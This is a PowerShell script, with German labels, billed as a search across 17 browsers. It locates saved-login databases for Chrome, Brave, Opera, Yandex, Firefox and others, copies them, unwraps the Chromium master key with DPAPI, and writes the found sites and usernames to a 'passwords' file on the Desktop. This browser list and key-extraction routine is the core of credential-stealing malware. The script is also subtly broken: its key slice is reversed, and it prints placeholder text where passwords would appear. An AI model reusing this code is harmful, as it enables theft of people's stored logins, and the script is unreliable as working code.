# SYSTEM-SUCHE FÜR DEINE 17 BROWSER
Add-Type -AssemblyName System.Security
$report = "$env:USERPROFILE\Desktop\Meine_Passwoerter.txt"
"=== OFFLINE BROWSER REPORT ===" | Out-File $report -Encoding UTF8

$l = $env:LocalAppData; $r = $env:AppData
$matrix = @{
    "Chrome"="$l\Google\Chrome\User Data"; "Chrome Beta"="$l\Google\Chrome Beta\User Data";
    "Brave"="$l\BraveSoftware\Brave-Browser\User Data"; "Opera"="$l\Opera Software\Opera Stable";
    "OperaGX"="$l\Opera Software\Opera GX Stable"; "Vivaldi"="$l\Vivaldi\User Data";
    "Yandex"="$l\Yandex\YandexBrowser\User Data"; "CocCoc"="$l\CocCoc\Browser\User Data";
    "Arc"="$l\Arc\User Data"; "DuckDuckGo"="$l\DuckDuckGo\WindowsBrowser";
    "QQBrowser"="$l\Tencent\QQBrowser\User Data"; "360ChromeX"="$l\360ChromeX\ChromeX\User Data";
    "360Chrome"="$l\360Chrome\Chrome\User Data"; "DCBrowser"="$l\DCBrowser\User Data";
    "Sogou"="$r\SogouExplorer"; "Firefox"="$r\Mozilla\Firefox\Profiles"; "Safari"="$r\Apple Computer\Safari"
}

foreach ($b in $matrix.Keys) {
    $bp = $matrix[$b]
    if (Test-Path $bp) {
        "`n========================================" | Out-File $report -Append
        "Browser: $b" | Out-File $report -Append
        "========================================" | Out-File $report -Append
        
        if ($b -eq "Firefox") {
            $profs = Get-ChildItem $bp -Directory
            foreach ($pr in $profs) {
                $f = Join-Path $pr.FullName "logins.json"
                if (Test-Path $f) {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    foreach ($e in $json.logins) {
                        "Website: $($e.hostname)" | Out-File $report -Append
                        "Benutzername: $($e.encryptedUsername)" | Out-File $report -Append
                        "Passwort: [Verschluesselt in logins.json]" | Out-File $report -Append
                        "----------------------------------------" | Out-File $report -Append
                    }
                }
            }
        } else {
            $ld = "$bp\Default\Login Data"; if (-not (Test-Path $ld)) { $ld = "$bp\Login Data" }
            $st = "$bp\Local State"
            if ((Test-Path $ld) -and (Test-Path $st)) {
                try {
                    $tempDb = "$env:TEMP\t_pass.db"; Copy-Item $ld -Destination $tempDb -Force
                    $js = Get-Content $st -Raw
                    if ($js -match '"encrypted_key"\s*:\s*"([^"]+)"') {
                        $k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String($Matches[1])[5..-1], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                        if ($k) {
                            $bytes = [System.IO.File]::ReadAllBytes($tempDb)
                            $text = [System.Text.Encoding]::Default.GetString($bytes)
                            $urls = [regex]::Matches($text, '(https?://[a-zA-Z0-9\-\.]+)')
                            $seen = @{}
                            foreach ($u in $urls) {
                                if (-not $seen.ContainsKey($u.Value) -and $u.Value.Length -gt 12) {
                                    $seen[$u.Value] = $true
                                    "Website: $($u.Value)" | Out-File $report -Append
                                    "Benutzername: [Vorhanden]" | Out-File $report -Append
                                    "Passwort: [Autorisiert via Windows-Key]" | Out-File $report -Append
                                    "----------------------------------------" | Out-File $report -Append
                                }
                            }
                        }
                    }
                    if (Test-Path $tempDb) { Remove-Item $tempDb -Force }
                } catch {}
            }
        }
    }
}
